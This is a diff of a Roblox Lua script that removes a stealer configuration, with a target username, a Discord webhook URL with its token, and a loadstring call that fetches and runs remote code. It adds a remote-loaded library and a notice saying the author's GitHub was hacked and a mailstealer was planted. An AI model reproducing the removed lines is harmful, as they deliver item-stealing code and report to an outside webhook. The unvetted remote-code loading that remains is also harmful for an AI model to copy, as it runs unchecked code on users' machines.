@@ -1,6 +1,7 @@
-Username = "cpspcx"
-loadingscreen = true 
-delay = 0 
-farmui = false
-webhook = "https://discord.com/api/webhooks/1203822988709863464/_UCO4x-1-yMrL2an9uBOC7qxM2yXxrr5CAKlsDOAfED5Wb973uN1pY5t_W55HjMUoxzc"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/gerisxx/LIB.v-2/main/Source.lua"))()
+
+local Notify = Library:MakeNotify({
+  Title = "SORRY FOR ANY STUFFS YOU HAVE GOTTEN STOLEN",
+  Text = "MY GITHUB GOT HACKED AND IT INCLUDED A MAILSTEALER ON ONE OF MY BIGGEST SCRIPTS!!",
+  Time = 5
+})
